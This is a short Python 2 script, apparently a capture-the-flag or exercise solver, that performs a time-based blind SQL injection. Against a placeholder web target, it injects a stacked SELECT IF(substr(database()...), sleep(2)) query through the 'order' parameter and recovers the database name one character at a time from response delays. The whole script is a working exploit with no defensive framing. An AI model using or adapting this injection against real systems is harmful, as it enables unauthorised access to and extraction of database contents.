import requests

import sys

reload(sys)

sys.setdefaultencoding('utf-8')



payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

user = ''

print "test..."

for i in range(1,11):

    for payload in payloads:

	aaa=" --"

	d="SELECT IF(substr(database() from %s for 1) = '%s', sleep(2), false)"% (i, payload)

	#pq={'q':'area','area_id':d}

	test = d + aaa

	#print test

	r = requests.get('http://ip/?birthday=2000&stature=170&level=0&sex=0&order=id;'+test)

	if r.elapsed.seconds>=1:

		user += payload

		#print payload.strip()

		break

print user